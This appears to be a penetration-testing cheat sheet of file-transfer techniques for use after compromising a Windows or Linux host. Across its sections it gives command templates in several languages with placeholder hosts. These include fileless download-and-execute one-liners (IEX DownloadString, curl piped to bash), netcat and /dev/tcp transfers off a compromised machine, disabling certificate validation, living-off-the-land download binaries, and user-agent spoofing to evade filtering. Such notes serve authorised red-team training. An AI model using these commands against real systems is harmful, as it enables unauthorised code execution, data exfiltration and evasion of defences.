# File Transfers

### Windows transfers

#### Powershell

**Downloads**

```shellscript
# File download to disk
iwr <URL> -OutFile <Output_File_Name>
Invoke-WebRequest <URL> -OutFile <Output_File_Name>
(New-Object Net.WebClient).DownloadFile('<URL>','<Output_File_Name>')
(New-Object Net.WebClient).DownloadFileAsync('<URL>','<Output_File_Name>')

# Run the file in memory instead of writing to disk
IEX (New-Object Net.WebClient).DownloadString('<URL>')
(New-Object Net.WebClient).DownloadString('<URL>') | IEX
IEX (iwr '<URL>')

$wr = [System.NET.WebRequest]::Create("<URL>")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()

# If error : The response content cannot be parsed because the Internet Explorer engine 
# is not available
Invoke-WebRequest <URL> -UseBasicParsing | IEX

# If error : Exception calling "DownloadString" with "1" argument(s): "The underlying 
# connection was closed: Could not establish trust
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
IEX(New-Object Net.WebClient).DownloadString('<URL>')

# Transfer from Linux to Windows by encoding / decoding b64
cat <FILE> |base64 -w 0;echo
[IO.File]::WriteAllBytes("<DEST_PATH>", [Convert]::FromBase64String("<B64>"))
```

**Uploads**

```shellscript
# Upload a file from Windows to Linux => start an upload server on Linux
# Default powershell does not support uploads, so use a script 
pip3 install uploadserver
python3 -m uploadserver
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<IP>:8000/upload -File <FILE>

# Base64 web upload
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE>' -Encoding Byte))
Invoke-WebRequest -Uri http://<IP>:<PORT>/ -Method POST -Body $b64
nc -lvnp <PORT>
echo <base64> | base64 -d -w 0 > <FILE>

# Transfer from Windows to Linux by encoding / decoding b64
[Convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
echo <B64> | base64 -d > <DEST_FILE>
```

#### SMB

```sh
sudo impacket-smbserver <SHARE_NAME> -smb2support <DIRECTORY_TO_SHARE>
copy \\<IP>\<SHARE_NAME>\<FILE>    # Copy file from the server to the host
copy <FILE> \\<IP>\<SHARE_NAME>\   # Copy file from the host to the server

# If unauthenticated guest access is blocked
sudo impacket-smbserver <SHARE_NAME> -smb2support <DIRECTORY_TO_SHARE> -user <USER> -password <PASS>
net use n: \\<IP>\<SHARE_NAME> /user:<USER> <PASS>
copy n:\<FILE>    # Copy file from the server to the host
copy <FILE> n:\   # Copy file from the host to the server

# If the computer doesn't allow outgoing SMB trafic => use webdav for HTTP
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
copy <FILE> \\<IP>\DavWWWRoot\   # DavWWWRoot is a keyword, it does not exist but will redirect to the server root
```

#### FTP

```sh
sudo pip3 install pyftpdlib

# Downloads
sudo python3 -m pyftpdlib --port 21
(New-Object Net.WebClient).DownloadFile('ftp://<IP>/<FILE>', '<Output File Name>')

# Uploads
sudo python3 -m pyftpdlib --port 21 --write
(New-Object Net.WebClient).UploadFile('ftp://<IP>/<Output File Name>', '<FILE>')
```

### Linux transfers

#### Bash

```sh
# Create a server
python3 -m http.server
python2.7 -m SimpleHTTPServer
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000

# File download to disk
wget <URL> -O <OUTPUT_FILE>
curl -o <OUTPUT_FILE> <URL>

# Run the file in memory instead of writing to disk
curl <URL> | bash
wget -qO- <URL> | bash 

# Download with bash /dev/tcp
exec 3<>/dev/tcp/<IP>/<PORT>            # Connect to the target webserver
echo -e "GET /<FILE> HTTP/1.1\n\n">&3   # HTTP GET request
cat <&3                                 # Print the response

# With SSH
scp <USER>@<IP>:/<PATH_TO_FILE> <OUTPUT_DESTINATION> 
scp <FILE> <USER>@<IP>:/<PATH_TO_UPLOAD>

# Base64 
cat <FILE> |base64 -w 0;echo
echo -n '<b64>' | base64 -d > <FILE>
```

### Code transfers

#### Python

```python
# Download
python3 -c "import urllib.request; urllib.request.urlretrieve('<URL>', '<OUTPUT_FILE>')"
python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<OUTPUT_FILE>")'

# Upload
python3 -m uploadserver 
python3 -c 'import requests;requests.post("http://<IP>:<PORT>/upload",files={"files":open("<FILE>","rb")})'
```

#### PHP

```php
# File download
php -r '$file = file_get_contents("<URL>"); file_put_contents("<OUTPUT_FILE>",$file);'
php -r 'const BUFFER = 1024; $fremote = fopen("<URL>", "rb"); $flocal = fopen("<OUTPUT_FILE>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Fileless execute
php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

#### Ruby

```ruby
ruby -e 'require "net/http"; File.write("<OUTPUT_FILE>", Net::HTTP.get(URI.parse("<URL>")))'
```

#### Perl

```perl
perl -e 'use LWP::Simple; getstore("<URL>", "<OUTPUT_FILE>");'
```

#### JS

```javascript
// JS for Windows => save to a file named wget.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

// Use the above JS to download a file from cmd.exe or Powershell
cscript.exe /nologo wget.js <URL> <OUTPUT_FILE>


// JS for Linux => save to a file named wget.js
const http = require('http');
const fs = require('fs');
const url = process.argv[2];
const output = process.argv[3];

http.get(url, (res) => {
  const file = fs.createWriteStream(output);
  res.pipe(file);
  file.on('finish', () => {
    file.close();
    console.log("Download completed.");
  });
}).on('error', (err) => {
  console.error("Error: " + err.message);
});

// Use the above JS to download a file
node wget.js <URL> <OUTPUT_FILE>
```

#### VBScript

```sh
# VBScript => save to a file named wget.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

# Use the above VBS to download a file from cmd.exe or Powershell
cscript.exe /nologo wget.vbs <URL> <OUTPUT_FILE>
```

### Miscellaneous transfers

#### Netcat and Ncat

```sh
# Listen on compromised machine 
nc -l -p <PORT> > <FILE>
ncat -l -p <PORT> --recv-only > <FILE>

# Sending the file from our host to listening compromised machine
nc -q 0 <IP> <PORT> < <FILE>
ncat --send-only <IP> <PORT> < <FILE>

# Another useful way if a firewall is blocking inbound traffic to the target

# Listen our on host and send the file as input to netcat
sudo nc -l -p 443 -q 0 < <FILE>
sudo ncat -l -p 443 --send-only < <FILE>

# The compromised machine conntects to our host
nc <IP> 443 > <FILE>
ncat <IP> 443 --recv-only > <FILE>
cat < /dev/tcp/<IP>/443 > <FILE>
```

#### PowerShell Session File Transfer

In case `HTTP`, `HTTPS` and `SMB` unavailable, we can use `WinRM`

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration

```powershell
# Test to see if the WinRM port is open on the remote machine
Test-NetConnection -ComputerName <COMPUTER_NAME> -Port 5985

# Create a remoting session. We didn't specify credentials because in the exemple, our 
# computer had privileges over database01
$Session = New-PSSession -ComputerName <COMPUTER_NAME>

# Copy file from our host to the target
Copy-Item -Path <FILE> -ToSession $Session -Destination <DEST_PATH>

# Copy remote file from target to our host
Copy-Item -Path "<FILE>" -Destination C:\ -FromSession $Session
```

#### RDP

```bash
# Mounting a linux folder to the target
rdesktop <IP> -d <DOMAIN> -u <USER> -p '<PASS>' -r disk:<SHARE_NAME>='<PATH_TO_DIRECTORY>'
xfreerdp /v:<IP> /d:<DOMAIN> /u:<USER> /p:'<PASS>' /drive:<SHARE_NAME>,<PATH_TO_DIRECTORY>

# To access the shared directory
Go to file explorer => network => tsclient

# Mount a windows folder to a target
Go to Remote Desktop Connection => local resources => local devices and resources => more => Drives
```

### Protected file transfers

Encrypting the data or files before a transfer is often necessary to prevent the data from being read if intercepted in transit

{% embed url="https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1" %}

```sh
# Windows
# Transfer the following file to the target => Invoke-AESEncryption.ps1

# Import the module above to use it
Import-Module .\Invoke-AESEncryption.ps1

# Use the now available function to create AES files 
Invoke-AESEncryption -Mode Encrypt -Key "<PASS>" -Path <FILE_TO_ENCRYPT>


# Linux
# Encrypt
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# Decrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

### Catching Files over HTTP/S

#### Secure upload Nginx server

```sh
# Create the upload directory
sudo mkdir -p /var/www/uploads/SecretUploadDirectory

# Change the owner to www-data 
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

# Create a the config file => etc/nginx/sites-available/upload.conf
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}

# Symlink our Site to the sites-enabled Directory
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

# Start Nginx
sudo systemctl restart nginx.service

# Check for errors => ex if the port 80 is already in use
tail -2 /var/log/nginx/error.log
ss -lnpt | grep 80

# If there is a service already listening on port 80 => remove Nginx default config
sudo rm /etc/nginx/sites-enabled/default

# Upload a file to the server 
curl -T <FILE> http://<IP>:9001/SecretUploadDirectory/<OUTPUT_FILE_NAME>
```

### Living off The Land

Search for upload and download functions on `LOLBAS` : search `/download` or `/upload`

Search for upload and download functions on `GTFOBins` : search `+file download` or `+file upload`

{% embed url="https://lolbas-project.github.io/" %}

{% embed url="https://gtfobins.github.io/" %}

```sh
# Might get an error if the binary is old and does not have the Post option
certreq.exe -Post -config http://<IP>:<PORT>/ <FILE>

certutil -urlcache -f http://<ip>:<port>/<local_file> <name_chosen>
certutil.exe -verifyctl -split -f http://<IP>:<PORT>/<FILE>

GfxDownloadWrapper.exe "http://<IP>/<FILE>" "<OUTPUT_FILE_NAME>"

bitsadmin /transfer wcb /priority foreground http://<IP>:<PORT>/<FILE> <OUTPUT_FILE_NAME>
Import-Module bitstransfer; Start-BitsTransfer -Source "http://<IP>:<PORT>/<FILE>" -Destination "<OUTPUT_FILE_NAME>"

# Create a certificate on our host
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
# Start the server on our host and pass the file as input
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < <FILE>
# Connect to the server from the target machine 
openssl s_client -connect <IP> -quiet > <OUTPUT_FILE_NAME>
```

### Evasion

If some filtering is taking place on the user agents

```powershell
# List user agents
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

# Select user agent
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome

# Send request with modified user agent
Invoke-WebRequest http://<IP>/<FILE> -UserAgent $UserAgent -OutFile "<OUTPUT_FILE_NAME>"
```
